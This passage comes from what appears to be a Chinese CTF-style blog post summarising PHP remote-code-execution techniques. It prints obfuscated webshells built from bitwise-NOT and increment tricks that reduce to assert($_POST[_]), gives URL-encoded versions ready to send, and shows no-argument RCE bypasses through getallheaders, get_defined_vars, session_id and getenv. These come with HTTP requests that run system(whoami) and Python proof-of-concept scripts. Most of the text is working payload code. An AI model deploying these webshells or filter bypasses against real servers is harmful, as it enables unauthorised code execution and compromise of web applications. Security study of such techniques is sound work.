+<p>可构造出webshell</p>
+<pre><code class="php">&lt;?php
+$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);
+$_=$__/$__;
+
+$____=&#39;&#39;;
+$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);
+
+$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);
+
+$_=$$_____;
+$____($_[$__]);
+</code></pre>
+<p>直接传入:</p>
+<pre><code class="php">$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);
+</code></pre>
+<p>使用时候进行下url编码</p>
+<pre><code class="php">%24__%3d(&#39;%3e&#39;%3e&#39;%3c&#39;)%2b(&#39;%3e&#39;%3e&#39;%3c&#39;)%3b%24_%3d%24__%2f%24__%3b%24____%3d&#39;&#39;%3b%24___%3d%22%e7%9e%b0%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9a%84%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%8d%8a%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%a7%8b%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24_____%3d&#39;_&#39;%3b%24___%3d%22%e4%bf%af%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9e%b0%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e6%ac%a1%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e7%ab%99%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24_%3d%24%24_____%3b%24____(%24_%5b%24__%5d)%3b
+</code></pre>
+<p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121220150735.png" alt="image-20221121220150735"></p>
+<h3 id="自增webshell"><a href="#自增webshell" class="headerlink" title="自增webshell"></a>自增webshell</h3><p>7.0.12以上版本不可使用</p>
+<p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p>
+<p>这就得借助PHP的一个小技巧，先看文档： <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></a></p>
+<p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p>
+<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>
+<p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p>
+<pre><code class="php">&lt;?php
+$_=[];
+$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;
+$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E 
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+
+$____=&#39;_&#39;;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
+
+$_=$$____;
+$___($_[_]); // ASSERT($_POST[_]);
+</code></pre>
+<p>可直接传入</p>
+<pre><code class="php">//测试发现7.0.12以上版本不可使用
+//使用时需要url编码下
+$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
+固定格式 构造出来的 assert($_POST[_]);
+url编码后再使用
+%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b&#39;!&#39;%3d%3d&#39;%40&#39;%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d&#39;_&#39;%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
+然后post传入   _=phpinfo();
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121210330927.png" alt="image-20221121210330927"></p>
+<h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>无参数RCE，其实就是通过<strong>没有参数的函数</strong>达到命令执行的目的。<br> <strong>没有参数的函数</strong>什么意思？一般该类题目代码如下(或类似)：</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;
+    eval($_GET[&#39;code&#39;]);
+&#125;
+</code></pre>
+<p>先来解读下代码：</p>
+<pre><code>如果&#39;;&#39;===preg_replace(...)，那么就执行exp传递的命令
+\ : 转义字符不多说了
+[a-z,_]+ : [a-z,_]匹配小写字母和下划线 +表示1到多个
+(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）
+</code></pre>
+<p>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。</p>
+<p>(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。</p>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>先来整理下经常需要用到的函数吧，后面会说具体使用:</p>
+<pre><code class="php">目录操作:
+getchwd() //函数返回当前工作目录。
+scandir() //函数返回指定目录中的文件和目录的数组。
+dirname() //函数返回路径中的目录部分。
+chdir() //函数改变当前的目录。
+
+数组操作:
+pos()     //current() 的别名
+reset()  //将数组的内部指针指向第一个单元
+end()     //将内部指针指向数组中的最后一个元素，并输出。
+next() //函数将内部指针指向数组中的下一个元素，并输出。
+prev()  //将数组内部指针倒回一位。
+each()  //返回当前元素的键名和键值，并将内部指针向前移动
+array_reverse()以相反的元素顺序返回数组。
+array_rand() 函数返回数组中的随机键名(也就是下标)，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+array_slice() 函数在数组中根据条件取出一段值，并返回。
+    
+读取文件操作:
+readfile() //输出一个文件。
+readgzfile()
+show_source()
+highlight_file()   //打印输出或者返回 filename 文件中语法高亮版本的代码。
+file_get_contents ()
+    
+其它函数:
+localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.
+current() 返回数组中的当前单元, 默认取第一个值。
+current(localeconv())永远都是个点
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin() — 转换十六进制字符串为二进制字符串。
+getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。
+localeconv() 函数返回一包含本地数字及货币格式信息的数组。
+    
+
+phpversion()返回php版本，如7.3.5
+floor(phpversion())返回7
+sqrt(floor(phpversion()))返回2.6457513110646
+tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615
+cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491
+sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156
+ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46
+chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回.
+var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录
+next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..
+//floor()：舍去法取整，sqrt()：平方根，tan()：正切值，cosh()：双曲余弦，sinh()：双曲正弦，ceil()：进一法取整
+    
+chr(ord(hebrevc(crypt(phpversion()))))`返回`.  //hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符
+//crypt()：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。
+//hebrevc()：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。
+
+</code></pre>
+<h2 id="dirname-amp-chdir"><a href="#dirname-amp-chdir" class="headerlink" title="dirname() &amp; chdir()"></a>dirname() &amp; chdir()</h2><p>这个方法并不可以rce，只是可以完成读取文件的操作，事实上在很多情况下已经够用了</p>
+<p>想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录</p>
+<pre><code class="php">var_dump(getcwd());
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174021764.png" alt="image-20221122174021764"></p>
+<p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可</p>
+<pre><code class="php">var_dump(scandir(getcwd()));
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174107093.png" alt="image-20221122174107093"></p>
+<p>如果getcwd()无法使用呢?</p>
+<p>我们知道localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p>
+<p>我们可构造出:</p>
+<pre><code class="php">var_dump(scandir(current(localeconv())));  //var_dump也可以用print_r代替
+var_dump(scandir(pos(localeconv())));
+var_dump(scandir(reset(localeconv())));
+var_dump(scandir(chr(current(localtime(time()))))); //chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于&quot;.&quot;所以使用chr(time())，一个周期必定出现一次&quot;.&quot; 我爆破了1w次，雀氏有可行性哈哈，不过雀氏有点小离谱
+var_dump(scandir(chr(ord(hebrevc(crypt(time())))))); //hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符
+var_dump(scandir(chr(ord(strrev(crypt(serialize(array())))))));  
+if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd())); //设置当前工作路径为根目录，然后遍历此目录
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175238708.png" alt="  "></p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175828251.png" alt="image-20221122175828251"></p>
+<p>如何进行目录上跳呢？我们用<code>dirname()</code>即可</p>
+<pre><code class="php">var_dump(scandir(dirname(getcwd())));
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174205898.png" alt="image-20221122174205898"></p>
+<p>那么怎么更改我们的当前目录呢？使用<code>chdir</code></p>
+<pre><code>chdir(dirname(getcwd()));  //将当前目录设置为上一级目录
+</code></pre>
+<p>搭配chadir来读取文件:</p>
+<pre><code class="php">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));
+</code></pre>
+<p>再给出其它一些读取文件的操作:</p>
+<pre><code class="php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));
+上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
+以上两个都是随机获取的其实，看脸,它们的作用都是随机选取一个根目录的文件进行读取
+</code></pre>
+<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h2><p>只适用于apache中间件</p>
+<img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122143753491.png" alt="image-20221122143753491" style="zoom:67%;">
+
+<p>我们来打印出来看看</p>
+<pre><code>http://127.0.0.1/index.php?code=var_dump(getallheaders());
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144238099.png" alt="image-20221122144238099"></p>
+<p>它把我们的header头输出了，但是header头我们是可以自定义的</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144525537.png" alt="image-20221122144525537"></p>
+<p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144718307.png" alt="image-20221122144718307"></p>
+<p>我们来使用一下，可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p>
+<pre><code class="php">var_dump(implode(getallheaders()));
+sakura: flag
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144928146.png" alt="image-20221122144928146"></p>
+<p>来执行命令:</p>
+<pre><code class="php">GET /index.php?code=eval(implode(getallheaders())); HTTP/1.1
+sakura: system(whoami);//
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122145432187.png" alt="image-20221122145432187"></p>
+<p>事实上这样操作具有局限性，万一我们输出的头不再最开始不就g了?</p>
+<p>但是我们有很多函数可以去帮我们去获得我们想要的字符串</p>
+<p>由于在开头第一个我们还可以使用pos函数去得到我们输入的命令</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150157102.png" alt="image-20221122150157102"></p>
+<p>假如说它的位置不在数组第一个，在最后一个呢?</p>
+<p>我们只需要使用end就可以把它取出来，这里我输入的值位置并不在第一个，所以取出来并没有用，只是做个示范罢了</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150850290.png" alt="image-20221122150850290"></p>
+<p>那么相信大家已经会了，现在我们如何取数组第二个呢?</p>
+<p>相信大家心里已经有了答案，使用next!</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122151030098.png" alt="image-20221122151030098"></p>
+<p>就是这样，搭配不同的函数取出我们想要的值即可</p>
+<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？这里我们可以使用get_defined_vars()</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122154832676.png" alt="image-20221122154832676"></p>
+<p>该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与<code>implode</code>结合起来用。将<code>get_defined_vars()</code>的结果用<code>var_dump()</code>输出结果如下：</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155240401.png" alt="image-20221122155240401"></p>
+<p>发现其可以回显全局变量:</p>
+<pre><code>$_GET
+$_POST
+$_FILES
+$_COOKIE
+</code></pre>
+<p>可以看到用GET传入的参数会被显示在数组中的第一位,不过这里有这么多的数组，我们也不需要全部查看,只需要使用<code>current()</code>函数就可以取到我们想要的东西</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155556428.png" alt="image-20221122155556428"></p>
+<p>我们来试一试:</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155713268.png" alt="image-20221122155713268"></p>
+<p>给我们返回了一个一维数组，我们再想办法取得第二个值:</p>
+<pre><code class="php">GET /index.php?code=var_dump(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155831177.png" alt="image-20221122155831177"></p>
+<p>然后就可以来执行命令</p>
+<pre><code class="php">GET /index.php?code=eval(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161512219.png" alt="image-20221122161512219"></p>
+<p>除了next还可以使用end</p>
+<pre><code class="php">GET /index.php?code=eval(end(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161858843.png" alt="image-20221122161858843"></p>
+<p>但一般网站喜欢对</p>
+<pre><code>$_GET
+$_POST
+$_COOKIE
+</code></pre>
+<p>做全局过滤，所以我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传</p>
+<pre><code class="python">import requests
+from io import BytesIO
+
+payload = &quot;system(&#39;ls /tmp&#39;);&quot;.encode(&#39;hex&#39;)
+files = &#123;
+  payload: BytesIO(&#39;sky cool!&#39;)
+&#125;
+
+r = requests.post(&#39;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files=files, allow_redirects=False)
+
+print r.content
+</code></pre>
+<p>注意:上面这个脚本只适用于$_FILES在最后的情况，要根据条件不用去修改其位置</p>
+<h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164305081.png" alt="image-20221122164305081"></p>
+<p>官方说：<code>session_id()</code>可以用来获取/设置当前会话 ID。<br> 那么可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。<br> 但其有限制：</p>
+<p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p>
+<p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164407079.png" alt="image-20221122164407079"></p>
+<p>但session_id必须要开启session才可以使用，所以我们要先使用session_start。</p>
+<p>所以，payload可以为：</p>
+<pre><code class="php">eval(hex2bin(session_id(session_start())));  //hex(&quot;phpinfo();&quot;)=706870696e666f28293b
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164738128.png" alt="image-20221122164738128"></p>
+<p>顺便给出一个poc:</p>
+<pre><code class="python">import requests
+url = &#39;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#39;
+payload = &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)
+cookies = &#123;
+    &#39;PHPSESSID&#39;:payload
+&#125;
+r = requests.get(url=url,cookies=cookies)
+print r.content
+</code></pre>
+<h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h2><p><strong>只适用于php7.1以后版本</strong></p>
+<p>通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。</p>
+<p>查阅php手册，有非常多的超全局变量</p>
+<pre><code class="php">$GLOBALS
+$_SERVER
+$_GET
+$_POST
+$_FILES
+$_COOKIE
+$_SESSION
+$_REQUEST
+$_ENV
+</code></pre>
+<p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122165153813.png" alt="image-20221122165153813"></p>
+<p>我们来打印一下吧:</p>
+<pre><code class="php">GET /index.php?code=var_dump(getenv()); HTTP/1.1
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170631213.png" alt="image-20221122170631213"></p>
+<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/2019-03-29-13-47-19.png" alt="img"></p>
+<p>我们来试一下:</p>
+<pre><code class="php">GET /index.php?code=var_dump(array_rand(getenv())); 
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170911592.png" alt="image-20221122170911592"></p>
+<p>但是我们不想要下标，我们想要下标的值，该怎么办呢?</p>
+<pre><code class="php">GET /index.php?code=var_dump(array_rand(array_flip(getenv()))); HTTP/1.1
